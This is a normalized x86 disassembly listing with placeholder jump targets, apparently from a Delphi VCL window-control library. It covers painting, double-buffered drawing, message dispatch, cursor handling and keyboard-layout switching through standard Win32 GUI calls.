mov eax [ esi + 0x19c ]
call sub_418700
call sub_44d00c
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_418700
call sub_44d00c
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_44d158
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f7d8
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406b7c
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_44d0c4
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406b90
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_44a198
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_44d1ec
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_449754
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_44a264
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44d158
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406b7c
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_448af0
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_44d0c4
test eax eax
je r-xdata
mov eax ebx
call sub_4607d8
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44a264
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_44fadc
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_44f7d8
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_44f7d8
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_44a198
sub_44d350
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_44a3f8
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_44a198
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_423dac
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_424a30
call sub_423dac
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_424a6c
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_448b4c
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_44d458
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_445e0c
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_44a198
mov [ esi + 0xc ] eax
mov bl 0x1
sub_44d48c
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_44d5ac
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44d5e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d5b3
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_418700
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_44d5e4
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_41875c
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_418700
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_4170c4
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_418700
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_423dac
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_4170c4
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_423dac
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_4170c4
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_4478c0
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_44a198
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_44d814
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_4478c0
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_44f7d8
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_44f7d8
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_44a198
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_44a198
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4478c0
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_44d814
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_418700
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_44d968
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44d48c
jmp r-xdata
mov eax ebx
call sub_44c508
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44daba
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_44f7d8
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_44a198
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_44d968
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_44f7d8
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_44dac8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44d458
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44dae8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_44d458
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44db5c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44d458
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44db7c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44d458
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44db9c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44d458
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44dbc0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44d458
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44dbe4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44d458
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44dc08
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44d458
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44dc2c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_43c760
mov edi eax
mov eax edi
call sub_43c840
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_424a6c
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_44f7d8
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_43c9d8
jmp r-xdata
sub_44dcb4
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_44aacc
test bl bl
je r-xdata
mov eax edi
call sub_44fae8
mov eax edi
call sub_44f6e0
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_44f6e0
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_44dd74
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_44a728
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_44ddc4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44fae8
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_44c098
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_403324
sub_44de0c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_448af0
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_44d0c4
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4690a0
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46752c
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_44df5c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_44e03b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e042
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_44f7d8
mov dl [ ebx + 0x184 ]
call sub_454468
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4674a4
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407f38
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4672a4
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4672a4
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4672a4
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_44e048
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44e0d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e0d9
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4674a4
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407f38
test eax eax
je r-xdata
mov eax ebx
call sub_44f7d8
mov dl 0x1
call sub_45444c
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_44e134
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_4170a0
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_44a198
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_44e184
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_44e1b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_403324
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_403324
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_44e1f8
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_44a198
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_44e250
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_421240
mov edx [ r-xdata ]
call sub_4032d8
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_44e288
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_418700
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44e2ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_44f7d8
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_44e308
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_44e274
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
